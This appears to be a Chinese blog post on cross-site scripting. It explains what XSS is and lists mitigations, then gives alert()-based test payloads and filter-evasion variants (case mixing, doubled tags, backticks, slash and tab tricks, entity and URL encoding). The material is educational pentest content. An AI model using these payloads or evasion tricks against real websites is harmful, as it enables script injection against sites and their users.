---
title: xss漏洞
date: 2024-12-22 16:33:32
categories: 
-  网安
tags: 
- 渗透
- 网安
- 测试
- XSS
top: 
---
[toc]
## 一、xss漏洞概念
XSS（跨站脚本攻击，Cross-Site Scripting）是一种安全漏洞，它允许攻击者在网页上注入恶意脚本。这些脚本可能用于盗取cookie，盗取用户数据、操纵DOM、进行网络钓鱼等。
## 二、xss漏洞解决办法

> 1、对所有的输入进行过滤和清理，确保输入的数据不包含任何可能导致XSS的字符或序列。
> 
> 2、对所有的输出进行编码，确保输出的数据不会被浏览器解释为代码。
> 
> 3、使用内容安全策略（CSP），它能有效地限制网页上可以加载的资源。
> 
> 4、使用HTTPOnly标志，防止脚本通过document.cookie获取cookie数据。
> 
> 5、对于富文本内容，使用可信的HTML解析器，并进行适当的转义。

 ## 三、xss漏洞payload
 在某个网页的提交内容处添加以下代码，测试是否有弹窗跳出，如果有则说明，该网站存在漏洞
 [更多payload](https://github.com/payloadbox/xss-payload-list.git)
 **典型脚本**
``` javascript  
<script>alert('xss')</script>
"><script>alert('xss')</script>

```

**利用 HTML 标签的属性脚本**

``` javascript
"><img src=x οnerrοr=alert("XSS");>

<img src=x:alert(alt) onerror=eval(src) alt=xss>

<img src=x onerror=alert('XSS');>

<img src=x onerror=alert(String.fromCharCode(88,83,83));>

```  
**变形方法脚本**
大小写

``` javascript
<sCript>alert('xss')</Script>        将标签中的部分小写字母改为大写
```
双写

``` javascript
<scrscriptipt>alert('xss')</scrscriptipt>        对原来的<script>标签变形	
```
引号

``` javascript
<img src="#" onerror="alert('xss')"/>        双引号包裹执行命令的alert函数
<img src="#" onerror=alert`xss`/>        反引号代替括号包裹xss内容

```
/ 代替空格

``` javascript
<img/src='#'/onerror='alert('xss')'/>

```
Tab 与回车

``` javascript
在语句中穿插 Tab和回车

<a href="j
avascript:alert('xss')">click me!
</a>

```
编码

``` javascript
<a href="j&#97;v&#x61;script:alert('xss')>click me!</a>        HTML实体编码
%3Cscript%3Ealert('xss')%3C/script%3E        URL编码

```